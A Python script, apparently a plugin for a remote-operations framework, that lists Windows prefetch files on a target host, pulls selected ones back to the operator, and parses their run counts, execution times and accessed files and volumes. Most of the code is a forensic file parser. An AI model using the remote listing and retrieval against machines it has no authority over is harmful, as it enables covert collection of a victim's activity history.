
import os
import sys
import codecs
from datetime import datetime, timedelta
from struct import unpack
import dsz, dsz.version.checks.windows
import ops, ops.cmd
from ops.pprint import pprint

def getsectionA(handle, offset, numentries):
    handle.seek(offset)
    sectionA = []
    for i in range(0, numentries):
        sectionA.append(fixendian(handle.read(4), 4))
    return sectionA

def getsectionB(handle, offset, numentries):
    handle.seek(offset)
    sectionB = []
    for i in range(0, numentries):
        val1 = fixendian(handle.read(4), 4)
        val2 = fixendian(handle.read(4), 4)
        val3 = fixendian(handle.read(4), 4)
        sectionB.append([val1, val2, val3])
    return sectionB

def getsectionC(handle, offset, length):
    handle.seek(offset)
    sectionC = []
    (files, thing) = codecs.getdecoder('utf_16')(handle.read(length), 'replace')
    files = files.replace('\x00', '\n')
    sectionC = files.strip().split('\n')
    return sectionC

def getsectionD(handle, offset, numvols, length, version):
    handle.seek(offset)
    sectionD = []
    for i in range(0, numvols):
        data = {}
        data['labeloffset'] = unpack('<i', handle.read(4))[0]
        data['labellength'] = unpack('<i', handle.read(4))[0]
        us = (int(fixendian(handle.read(8), 8), 16) / 10.0)
        data['accesstimestamp'] = (datetime(1601, 1, 1) + timedelta(microseconds=us)).__str__()
        data['volserial'] = fixendian(handle.read(4), 4)
        data['subsec1offset'] = unpack('<i', handle.read(4))[0]
        data['subsec1length'] = unpack('<i', handle.read(4))[0]
        data['subsec2offset'] = unpack('<i', handle.read(4))[0]
        data['subsec2length'] = unpack('<i', handle.read(4))[0]
        if (version == 23):
            data['vh9'] = unpack('<68s', handle.read(68))[0]
        else:
            data['vh9'] = unpack('<4s', handle.read(4))[0]
        sectionD.append(data)
        data['vollabel'] = getvollabel(handle, offset, data['labeloffset'], data['labellength'])
        data['subsec1'] = getDsubsection1(handle, offset, data['subsec1offset'], version)
        data['subsec2'] = getDsubsection2(handle, offset, data['subsec2offset'], data['subsec2length'])
    return sectionD

def getDsubsection1(handle, sectiondoffset, offset, version):
    handle.seek((sectiondoffset + offset))
    data = {}
    data['vs1'] = unpack('<i', handle.read(4))[0]
    data['numberentries'] = unpack('<i', handle.read(4))[0]
    if (version == 23):
        data['vs3'] = unpack('<4s', handle.read(4))[0]
    data['entries'] = []
    for i in range(0, data['numberentries']):
        data['entries'].append(fixendian(handle.read(8), 8))
    return data

def getDsubsection2(handle, sectiondoffset, offset, length):
    handle.seek((sectiondoffset + offset))
    data = []
    for i in range(0, length):
        strlength = unpack('<H', handle.read(2))[0]
        unistring = codecs.getdecoder('utf_16')(handle.read((strlength * 2)), 'replace')[0].split('\x00')[0]
        null = handle.read(2)
        data.append([strlength, unistring])
    return data

def getvollabel(handle, sectiondoffset, offset, length):
    handle.seek((sectiondoffset + offset))
    vollabel = handle.read((length * 2))
    (vollabel, thing) = codecs.getdecoder('utf_16')(vollabel, 'replace')
    return vollabel

def fixendian(bytes, length):
    bytes = bytes.encode('hex')
    packstring = ('2s' * length)
    bytes = unpack(packstring, bytes)
    bytes = tuple(reversed(bytes))
    bytes = ''.join(map(str, bytes))
    return bytes

def readfile(prefetchfile):
    data = {}
    file = open(prefetchfile, 'rb')
    data['fileversion'] = unpack('<i', file.read(4))[0]
    data['magicstring'] = unpack('<4s', file.read(4))[0]
    data['osindicator'] = unpack('<i', file.read(4))[0]
    data['prefetchfilelength'] = unpack('<i', file.read(4))[0]
    data['exename'] = codecs.getdecoder('utf_16')(file.read(60), 'replace')[0].split('\x00')[0]
    data['prefetchhash'] = fixendian(file.read(4), 4)
    data['h7'] = fixendian(file.read(4), 4)
    data['sectionaoffset'] = unpack('<i', file.read(4))[0]
    data['sectionanumentries'] = unpack('<i', file.read(4))[0]
    data['sectionboffset'] = unpack('<i', file.read(4))[0]
    data['sectionbnumentries'] = unpack('<i', file.read(4))[0]
    data['sectioncoffset'] = unpack('<i', file.read(4))[0]
    data['sectionclength'] = unpack('<i', file.read(4))[0]
    data['sectiondoffset'] = unpack('<i', file.read(4))[0]
    data['sectiondnumvols'] = unpack('<i', file.read(4))[0]
    data['sectiondlength'] = unpack('<i', file.read(4))[0]
    if (data['fileversion'] == 23):
        data['h17'] = fixendian(file.read(4), 4)
        data['h18'] = fixendian(file.read(4), 4)
    us = (int(fixendian(file.read(8), 8), 16) / 10.0)
    data['lastexectimestamp'] = (datetime(1601, 1, 1) + timedelta(microseconds=us)).__str__()
    data['h20'] = fixendian(file.read(16), 16)
    data['numexec'] = unpack('<i', file.read(4))[0]
    data['h22'] = fixendian(file.read(4), 4)
    data['sectiona'] = getsectionA(file, data['sectionaoffset'], data['sectionanumentries'])
    data['sectionb'] = getsectionB(file, data['sectionboffset'], data['sectionbnumentries'])
    data['sectionc'] = getsectionC(file, data['sectioncoffset'], data['sectionclength'])
    data['sectiond'] = getsectionD(file, data['sectiondoffset'], data['sectiondnumvols'], data['sectiondlength'], data['fileversion'])
    file.close()
    return data

def getpretchfiles(prefetchdir):
    cmd = ops.cmd.getDszCommand('dir')
    cmd.mask = '*.pf'
    cmd.path = prefetchdir
    obj = cmd.execute()
    prefetchfiles = []
    index = 1
    if cmd.success:
        for dir in obj.diritem:
            for file in dir.fileitem:
                prefetchfiles.append({'index': index, 'name': file.name, 'size': file.size, 'path': dir.path, 'accessed': file.filetimes.accessed.time.split('.')[0].replace('T', ' '), 'modified': file.filetimes.modified.time.split('.')[0].replace('T', ' '), 'created': file.filetimes.created.time.split('.')[0].replace('T', ' ')})
                index += 1
    return prefetchfiles

def getfile(file):
    cmd = ops.cmd.getDszCommand('get')
    cmd.arglist = [('-mask %s -path %s' % (file['name'], file['path']))]
    obj = cmd.execute()
    if cmd.success:
        return os.path.join(dsz.lp.GetLogsDirectory(), obj.filelocalname[0].subdir, obj.filelocalname[0].localname)
    else:
        return None

def getlist(itemlist):
    want = ''
    want = dsz.ui.GetString('Please provide a list of indexes you would like (ex: "1,3,5-7,13"): ', want)
    wantlist = want.split(',')
    intlist = []
    for item in wantlist:
        if (len(item.split('-')) == 2):
            itemrange = item.split('-')
            for integer in range(int(itemrange[0]), (int(itemrange[1]) + 1)):
                try:
                    intlist.append(integer)
                except:
                    continue
        else:
            try:
                intlist.append(int(item))
            except:
                continue
    outlist = []
    for item in itemlist:
        if (item['index'] in intlist):
            outlist.append(item)
    return outlist

def main():
    if (len(sys.argv) == 1):
        dsz.ui.Echo('====================================')
        dsz.ui.Echo('= Getting a list of prefetch files =')
        dsz.ui.Echo('====================================')
        prefetch = getpretchfiles('c:\\windows\\prefetch')
        pprint(prefetch, header=['Index', 'Name', 'Size', 'Created', 'Modified', 'Accessed'], dictorder=['index', 'name', 'size', 'created', 'modified', 'accessed'])
        dsz.ui.Echo('Found the above files in the prefetch, please select which you would like to pull and parse', dsz.GOOD)
        wantlist = getlist(prefetch)
        shortparse = []
        for file in wantlist:
            localfile = getfile(file)
            file['localfile'] = localfile
            data = readfile(localfile)
            good_data = {'index': file['index'], 'name': file['name'], 'bytes': data['prefetchfilelength'], 'runs': data['numexec'], 'last': data['lastexectimestamp'], 'localfile': file['localfile'], 'sectionc': data['sectionc'], 'sectiond': data['sectiond']}
            shortparse.append(good_data)
        print ''
        dsz.ui.Echo('====================================')
        dsz.ui.Echo('=========== Short Parse ============')
        dsz.ui.Echo('====================================')
        pprint(shortparse, header=['Index', 'Name', 'Byte Length', 'Number of Runs', 'Last Execute Time'], dictorder=['index', 'name', 'bytes', 'runs', 'last'])
        dsz.ui.Echo('Of the files you pulled back, which would you like to see the called files?', dsz.GOOD)
        parselist = getlist(shortparse)
        print ''
        for file in parselist:
            bannerstring = ('================ %s ====================' % file['name'])
            bannercap = ('=' * len(bannerstring))
            dsz.ui.Echo(bannercap, dsz.GOOD)
            dsz.ui.Echo(bannerstring, dsz.GOOD)
            dsz.ui.Echo(bannercap, dsz.GOOD)
            dsz.ui.Echo('Files Accessed:')
            for dll in file['sectionc']:
                dsz.ui.Echo(('\t\t%s' % ops.utf8(dll)))
            dsz.ui.Echo('\\Volumes Accessed:')
            for sectiond in file['sectiond']:
                dsz.ui.Echo(('\tVolume Label: %s' % sectiond['vollabel']))
                dsz.ui.Echo(('\tVolume Serial: %s' % sectiond['volserial']))
                dsz.ui.Echo(('\tAccess timestamp: %s' % sectiond['accesstimestamp']))
                dsz.ui.Echo('\tDirectories Accessed:')
                for directory in sectiond['subsec2']:
                    dsz.ui.Echo(('\t\t%s' % ops.utf8(directory[1])))
    else:
        prefetchFile = sys.argv[1]
        data = readfile(prefetchFile)
        good_data = [{'bytes': data['prefetchfilelength'], 'runs': data['numexec'], 'last': data['lastexectimestamp'], 'sectionc': data['sectionc'], 'sectiond': data['sectiond']}]
        pprint(good_data, header=['Byte Length', 'Number of Runs', 'Last Execute Time'], dictorder=['bytes', 'runs', 'last'])
        dsz.ui.Echo('Files Accessed:')
        for dll in data['sectionc']:
            dsz.ui.Echo(('\t\t%s' % ops.utf8(dll)))
        dsz.ui.Echo('\\Volumes Accessed:')
        for sectiond in data['sectiond']:
            dsz.ui.Echo(('\tVolume Label: %s' % sectiond['vollabel']))
            dsz.ui.Echo(('\tVolume Serial: %s' % sectiond['volserial']))
            dsz.ui.Echo(('\tAccess timestamp: %s' % sectiond['accesstimestamp']))
            dsz.ui.Echo('\tDirectories Accessed:')
            for directory in sectiond['subsec2']:
                dsz.ui.Echo(('\t\t%s' % ops.utf8(directory[1])))
if (__name__ == '__main__'):
    main()